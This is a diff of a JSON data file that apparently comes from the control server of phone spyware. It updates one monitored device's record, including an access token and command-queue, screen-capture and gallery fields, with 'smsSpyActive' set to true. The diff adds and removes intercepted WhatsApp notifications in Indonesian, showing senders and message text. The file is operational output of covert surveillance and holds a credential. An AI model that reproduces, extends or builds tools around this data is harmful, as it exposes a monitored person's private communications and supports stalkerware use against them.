@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776947436304,
+    "lastSeen": 1776947445567,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Oi: BEW STORE",
+        "content": "Memberi reaksi 🕒 pada \"🔗 Kunjungi TikTok untuk menemukan video! | .tiktok https://vt.tiktok.com/ZS9N5NXNo/\"",
+        "time": "23/04 20:30",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776947446051
+      },
       {
         "appName": "WhatsApp",
         "sender": "Wabot",
@@ -4011,14 +4019,6 @@
         "time": "23/04 19:13",
         "pkg": "com.whatsapp",
         "receivedAt": 1776942784053
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎59 pesan dari 39 chat",
-        "time": "23/04 19:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776942783161
       }
     ],
     "galleryPhotos": [],
